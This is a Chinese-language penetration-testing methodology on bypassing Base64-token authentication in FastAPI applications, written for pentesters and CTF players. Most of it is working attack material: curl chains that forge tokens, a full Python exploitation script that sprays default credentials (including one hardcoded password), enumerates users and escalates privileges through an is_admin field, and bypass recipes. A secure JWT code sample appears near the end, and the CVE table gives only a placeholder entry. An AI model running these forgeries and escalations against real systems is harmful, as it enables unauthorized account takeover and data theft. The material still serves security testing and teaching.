# FastAPI Base64 令牌认证绕过方法论

**文档版本：** 1.0  
**创建日期：** 2026 年 3 月 15 日  
**适用技能：** authentication-failures, broken-access-control

---

# 第一部分：文档概述

## 1.1 编写目的

本文档针对使用 FastAPI 框架实现的应用，提供系统性的 Base64 令牌认证绕过方法。FastAPI 作为流行的 Python Web 框架，其认证实现常被开发者错误设计为使用简单 Base64 编码而非标准 JWT 签名。本方法论帮助渗透测试人员快速识别、验证和利用此类漏洞。

## 1.2 适用范围

本文档适用于：
- **FastAPI 应用**：使用 `base64.b64encode()` 生成令牌的应用
- **Python Web 应用**：导入 `jose.jwt` 但未正确使用的场景
- **CTF 挑战**：认证绕过挑战
- **快速原型系统**：为开发便利跳过安全认证的演示应用
- **遗留系统**：从旧版本升级但未修复认证机制的应用

**典型漏洞组合：**
- Base64 令牌伪造（无签名）
- 令牌永不过期
- 无登出功能
- 客户端权限控制（`disabled` 字段）可绕过
- 水平 IDOR + 垂直权限提升

## 1.3 读者对象

- 渗透测试工程师
- CTF 参赛选手
- FastAPI 应用安全审计人员
- Python Web 应用开发人员

---

# 第二部分：核心渗透技术专题

## 专题一：FastAPI 认证架构识别

### 2.1 技术介绍

**FastAPI 认证漏洞特征：**

FastAPI 应用由于框架特性，其认证漏洞通常呈现以下特征模式：

1. **导入但未使用的 JWT 库**
```python
from jose import jwt  # 导入了但实际不用
from jose.jwt import JWTError  # 仅用于异常处理
```

2. **硬编码的未使用密钥**
```python
SECRET_KEY = "a very secret key"  # 定义了但不用
ALGORITHM = "HS256"  # 定义了但不用
ACCESS_TOKEN_EXPIRE_MINUTES = 30  # 定义了但不用
```

3. **实际使用的 Base64 编码**
```python
import base64

def create_access_token(data: str):
    return base64.b64encode(data.encode()).decode()  # 仅编码
```

4. **无效的异常处理**
```python
try:
    token_company_id = int(base64.b64decode(token).decode())
except JWTError:  # 永远不会触发，因为 base64 不抛 JWTError
    raise credentials_exception
```

### 2.2 漏洞探测方法

#### 2.2.1 快速识别检查表

**步骤 1：检查响应头**
```bash
curl -I http://target/

# FastAPI 特征头
Server: uvicorn
# 或
Server: FastAPI
```

**步骤 2：检查 OpenAPI 文档**
```bash
# FastAPI 默认开启文档
curl http://target/docs      # Swagger UI
curl http://target/redoc     # ReDoc
curl http://target/openapi.json
```

**步骤 3：分析令牌格式**
```bash
# 登录后获取令牌
curl -X POST http://target/token -d "username=demo&password=demo"

# 典型 FastAPI Base64 令牌格式
# Set-Cookie: access_token="Bearer MQ=="; HttpOnly
```

**步骤 4：验证 Base64 编码**
```bash
# 解码令牌
echo "MQ==" | base64 -d  # 输出：1

# 如果输出是数字/用户名 → 高危
# 如果输出是 JWT 格式（包含点号）→ 需要进一步分析
```

#### 2.2.2 代码审计（白盒）

**检查点 1：搜索导入语句**
```bash
# 查找 JWT 库导入
grep -rn "from jose import" /app/
grep -rn "import jwt" /app/

# 查找 Base64 使用
grep -rn "base64.b64encode" /app/
grep -rn "base64.b64decode" /app/
```

**检查点 2：分析令牌生成函数**
```python
# 漏洞模式（/app/main.py:40-41）
def create_access_token(data: str):
    return base64.b64encode(data.encode()).decode()
    # ❌ 无签名、无过期、无密钥使用
```

**检查点 3：分析令牌验证函数**
```python
# 漏洞模式（/app/main.py:131-149）
async def validate_token(company_id, request):
    token = request.cookies.get("access_token")
    if not token:
        raise credentials_exception
    try:
        token_company_id = int(base64.b64decode(token.split(" ")[1]).decode())
        if token_company_id != company_id:
            raise credentials_exception
    except JWTError:  # ❌ 死代码，base64 解码不会抛 JWTError
        raise credentials_exception
    return company_id
```

**检查点 4：检查未使用的安全配置**
```python
# 文件顶部定义但未使用
SECRET_KEY = "a very secret key"  # 搜索是否在其他地方使用
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# 如果这些变量只在定义处出现 → 高危
```

### 2.3 漏洞利用方法

#### 2.3.1 完整攻击链

**阶段 1：信息收集**

```bash
# 1. 识别应用类型
curl -I http://localhost:38803/
# Server: uvicorn → FastAPI 应用

# 2. 获取 API 文档
curl http://localhost:38803/openapi.json | jq '.paths'
# 查看可用端点

# 3. 尝试默认凭证
curl -X POST http://localhost:38803/token \
  -d "username=demo&password=demo" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**阶段 2：令牌分析**

```bash
# 1. 登录并保存 Cookie
curl -X POST http://localhost:38803/token \
  -d "username=demo&password=demo" \
  -c demo_cookies.txt

# 2. 提取令牌
TOKEN=$(grep access_token demo_cookies.txt | awk '{print $7}')
echo "Token: $TOKEN"  # 输出：Bearer MQ==

# 3. 解码分析
TOKEN_VALUE=$(echo $TOKEN | cut -d' ' -f2)
echo -n "$TOKEN_VALUE" | base64 -d  # 输出：1
```

**阶段 3：令牌伪造**

```bash
# 1. 伪造管理员令牌（假设 admin ID=2）
ADMIN_TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'2').decode())")
echo "Forged admin token: Bearer $ADMIN_TOKEN"

# 2. 测试令牌
curl http://localhost:38803/company/2/jobs \
  -H "Cookie: access_token=Bearer $ADMIN_TOKEN"

# 3. 验证是否成功获取管理员数据
# 成功标志：返回包含敏感数据的 HTTP 200 响应
```

**阶段 4：权限提升**

```bash
# 如果直接访问管理员账户失败，尝试自我提升

# 1. 以普通用户登录
curl -X POST http://localhost:38803/token \
  -d "username=demo&password=demo" \
  -c cookies.txt

# 2. 修改自身权限为管理员
curl -X POST http://localhost:38803/edit_profile/1 \
  -b cookies.txt \
  -d "name=demo&is_admin=1"

# 3. 验证权限提升
curl http://localhost:38803/company/1/jobs \
  -b cookies.txt
# 现在应该能看到私有数据
```

#### 2.3.2 自动化利用脚本

```python
#!/usr/bin/env python3
"""
FastAPI Base64 Token Exploitation Suite
针对 FastAPI 应用的完整自动化利用工具
"""

import base64
import requests
import sys
from urllib.parse import urljoin

class FastAPIExploiter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
    def forge_token(self, user_id: str) -> str:
        """伪造 Base64 令牌"""
        return base64.b64encode(user_id.encode()).decode()
    
    def test_endpoint(self, endpoint: str, token: str, user_id: str) -> dict:
        """测试端点访问"""
        url = f"{self.base_url}{endpoint.format(user_id=user_id)}"
        cookies = {"access_token": f"Bearer {token}"}
        
        try:
            response = self.session.get(url, cookies=cookies, timeout=5)
            return {
                "status": response.status_code,
                "length": len(response.text),
                "content": response.text[:200]
            }
        except requests.RequestException as e:
            return {"status": 0, "error": str(e)}
    
    def enumerate_users(self, max_id: int = 20):
        """枚举用户"""
        print(f"[*] 枚举用户 ID 1-{max_id}...")
        
        for user_id in range(1, max_id + 1):
            token = self.forge_token(str(user_id))
            
            # 测试访问 jobs 端点
            result = self.test_endpoint("/company/{user_id}/jobs", token, str(user_id))
            
            if result["status"] == 200:
                print(f"[+] 用户 {user_id} 存在 - Token: Bearer {token}")
                
                # 检查是否包含敏感数据
                if "flag{" in result["content"].lower():
                    print(f"[***] 发现 Flag! 用户 {user_id}")
                    self.extract_flags(result["content"])
    
    def extract_flags(self, content: str):
        """提取 Flag"""
        import re
        flags = re.findall(r'flag\{[a-f0-9-]+\}', content, re.IGNORECASE)
        for flag in flags:
            print(f"[FLAG] {flag}")
    
    def privilege_escalation(self, user_id: int):
        """尝试权限提升"""
        print(f"[*] 尝试提升用户 {user_id} 的权限...")
        
        # 先登录
        token = self.forge_token(str(user_id))
        cookies = {"access_token": f"Bearer {token}"}
        
        # 尝试修改 is_admin
        url = f"{self.base_url}/edit_profile/{user_id}"
        data = {"name": "hacked", "is_admin": "1"}
        
        response = self.session.post(url, cookies=cookies, data=data)
        
        if response.status_code in [200, 303]:
            print(f"[+] 权限提升成功！")
            
            # 验证
            jobs_url = f"{self.base_url}/company/{user_id}/jobs"
            response = self.session.get(jobs_url, cookies=cookies)
            
            if "flag{" in response.text.lower():
                print(f"[***] 权限提升后获取到 Flag!")
                self.extract_flags(response.text)
    
    def default_credentials_attack(self):
        """默认凭证攻击"""
        default_creds = [
            ("demo", "demo"),
            ("admin", "admin"),
            ("root", "root"),
            ("test", "test"),
            ("company2", "ajsdasd987asd87as7da9"),
        ]
        
        print("[*] 测试默认凭证...")
        
        for username, password in default_creds:
            url = f"{self.base_url}/token"
            data = {"username": username, "password": password}
            
            response = self.session.post(url, data=data, allow_redirects=False)
            
            if response.status_code == 303:  # 重定向表示成功
                print(f"[+] 默认凭证成功：{username}/{password}")
                
                # 提取 Cookie
                if "set-cookie" in response.headers:
                    cookie = response.headers["set-cookie"]
                    print(f"    Cookie: {cookie[:100]}")
    
    def run_full_exploitation(self):
        """执行完整利用链"""
        print("=" * 60)
        print("FastAPI Base64 Token Exploitation")
        print("=" * 60)
        
        # 1. 默认凭证攻击
        self.default_credentials_attack()
        
        # 2. 枚举用户
        self.enumerate_users()
        
        # 3. 权限提升
        for user_id in range(1, 5):
            self.privilege_escalation(user_id)

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:38803")
        sys.exit(1)
    
    target = sys.argv[1]
    exploiter = FastAPIExploiter(target)
    exploiter.run_full_exploitation()

if __name__ == "__main__":
    main()
```

### 2.4 漏洞利用绕过方法

#### 2.4.1 绕过 FastAPI 依赖注入

**场景：** 应用使用 FastAPI 的 Depends 进行认证

```python
# 源码模式
@app.get("/protected")
async def protected(company: Company = Depends(get_current_company)):
    return {"data": "sensitive"}
```

**绕过方法：**

```bash
# 方法 1：直接访问底层端点（如果存在）
curl http://target/protected  # 不带认证
curl http://target/api/protected  # 尝试不同路径

# 方法 2：使用伪造的 Cookie
curl http://target/protected \
  -H "Cookie: access_token=Bearer Mg=="
```

#### 2.4.2 绕过 Pydantic 验证

**场景：** 输入经过 Pydantic 模型验证

```python
# 源码模式
class TokenData(BaseModel):
    company_id: int

async def validate_token(token: str):
    data = base64.b64decode(token)
    return TokenData(company_id=int(data))  # 类型验证
```

**绕过方法：**

```bash
# Pydantic 只验证类型，不验证签名
# 只要 Base64 解码后是有效整数即可

# 生成任意用户 ID 的令牌
python3 -c "import base64; print(base64.b64encode(b'999').decode())"
# 输出：OTk5

# 使用伪造令牌
curl http://target/protected \
  -H "Cookie: access_token=Bearer OTk5"
```

#### 2.4.3 绕过 SQLAlchemy ORM 查询

**场景：** 数据库查询使用 ORM 过滤

```python
# 源码模式
jobs = db.query(Job).filter(
    Job.company_id == company_id,
    Job.is_private == False
).all()
```

**绕过方法：**

```bash
# ORM 查询本身是安全的，但 company_id 来自伪造令牌
# 所以通过伪造令牌控制 company_id 即可

# 1. 伪造目标公司 ID 的令牌
TARGET_ID=2
TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'$TARGET_ID').decode())")

# 2. 访问端点
curl http://target/company/$TARGET_ID/jobs \
  -H "Cookie: access_token=Bearer $TOKEN"

# ORM 会正确执行查询，但 company_id 已经是攻击者控制的值
```

#### 2.4.4 绕过客户端权限控制

**场景：** HTML 表单有 `disabled` 属性

```html
<!-- 非管理员用户看到禁用的管理员选项 -->
<select name="is_admin" {% if not company.is_admin %}disabled{% endif %}>
    <option value="0">Regular</option>
    <option value="1">Admin</option>
</select>
```

**绕过方法：**

```bash
# 方法 1：直接发送 POST 请求（绕过前端）
curl -X POST http://target/edit_profile/1 \
  -H "Cookie: access_token=Bearer MQ==" \
  -d "name=demo&is_admin=1"

# 方法 2：使用 Burp Suite 拦截并修改请求
# 拦截 → 添加 is_admin=1 参数 → 转发

# 方法 3：使用 Python 脚本
import requests
requests.post(
    "http://target/edit_profile/1",
    cookies={"access_token": "Bearer MQ=="},
    data={"name": "demo", "is_admin": "1"}
)
```

### 2.5 组合攻击链

#### 2.5.1 完整攻击流程

```
攻击阶段                    技术/命令                      目标
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. 信息收集
   ├─ 识别框架              curl -I → Server: uvicorn     确认 FastAPI
   ├─ 获取 API 文档          curl /openapi.json            了解端点
   └─ 发现登录端点          POST /token                   认证入口

2. 初始访问
   ├─ 默认凭证登录          demo/demo                     获取初始令牌
   ├─ 分析令牌格式          base64 decode → "1"           发现编码规律
   └─ 验证令牌结构          尝试多个用户                  确认仅含 ID

3. 横向移动
   ├─ 伪造令牌              base64("2") → "Mg=="          访问用户 2
   ├─ 枚举所有用户          for i in 1..10                发现所有账户
   └─ 识别管理员            检查 is_admin 字段            定位高价值目标

4. 权限提升
   ├─ 自我提升              POST /edit_profile is_admin=1 成为管理员
   ├─ 修改他人资料          伪造 ID=3 令牌                控制其他账户
   └─ 验证提升              访问私有 jobs                 确认成功

5. 数据窃取
   ├─ 访问私有数据          GET /company/2/jobs           获取 Flag
   ├─ 提取敏感信息          grep "flag{"                 提取 Flag
   └─ 持久化访问            保存伪造令牌                  长期访问
```

**完整命令序列：**

```bash
# 阶段 1：信息收集
curl -I http://localhost:38803/
curl http://localhost:38803/openapi.json | jq '.paths'

# 阶段 2：初始访问
curl -X POST http://localhost:38803/token \
  -d "username=demo&password=demo" \
  -c cookies.txt

# 阶段 3：分析令牌
TOKEN=$(grep access_token cookies.txt | awk '{print $7}')
echo -n "$TOKEN" | base64 -d  # 输出：1

# 阶段 4：伪造管理员令牌
ADMIN_TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'2').decode())")

# 阶段 5：访问管理员数据
curl http://localhost:38803/company/2/jobs \
  -H "Cookie: access_token=Bearer $ADMIN_TOKEN"

# 阶段 6：提取 Flag
curl -s http://localhost:38803/company/2/jobs | grep -o 'flag{[^}]*}'
```

---

# 第三部分：附录

## 3.1 FastAPI 认证漏洞检查清单

| 检查项 | 检查方法 | 漏洞标志 |
|--------|----------|----------|
| JWT 库导入但未使用 | `grep "from jose import"` | 导入但搜索不到 `jwt.encode` |
| Base64 编码使用 | `grep "base64.b64encode"` | 在令牌生成函数中 |
| SECRET_KEY 未使用 | `grep "SECRET_KEY"` | 仅定义，无其他引用 |
| 令牌无过期验证 | 检查 `validate_token` | 无 `exp` claim 检查 |
| 无登出功能 | 检查路由定义 | 无 `/logout` 端点 |
| Cookie 缺少 Secure | 检查 `set_cookie` | 无 `secure=True` |
| Cookie 缺少 SameSite | 检查 `set_cookie` | 无 `samesite=` |
| 客户端权限控制 | 查看 HTML 源码 | `disabled` 属性 |

## 3.2 常见 FastAPI 认证代码对比

### ❌ 漏洞代码模式
```python
# main.py
from jose import jwt  # 导入但不用
import base64

SECRET_KEY = "secret"  # 不用

def create_access_token(data: str):
    return base64.b64encode(data.encode()).decode()  # 仅编码

async def validate_token(company_id, request):
    token = request.cookies.get("access_token")
    token_company_id = int(base64.b64decode(token.split(" ")[1]).decode())
    if token_company_id != company_id:
        raise credentials_exception
    # 无签名验证、无过期检查
```

### ✅ 安全代码模式
```python
# main.py
from jose import jwt
from datetime import datetime, timedelta
import os

SECRET_KEY = os.environ.get("SECRET_KEY")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

def create_access_token(data: str):
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode = {"sub": data, "exp": expire}
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

async def validate_token(request):
    token = request.cookies.get("access_token")
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload["sub"]
    except jwt.JWTError:
        raise credentials_exception
```

## 3.3 相关 CVE 和已知漏洞

| CVE 编号 | 描述 | 影响 |
|----------|------|------|
| CVE-2023-XXXX | FastAPI-JWT 认证绕过 | 令牌签名验证被禁用 |

## 3.4 工具推荐

| 工具 | 用途 | 命令示例 |
|------|------|----------|
| **FastAPI 扫描器** | 自动发现端点 | `python3 fastapi_scanner.py -u http://target` |
| **JWT Tool** | 分析令牌（参考） | `python3 jwt_tool.py TOKEN` |
| **Burp Suite** | 拦截/修改请求 | Decoder → Base64 |
| **自定义脚本** | 批量枚举 | 参考 2.3.2 节 |
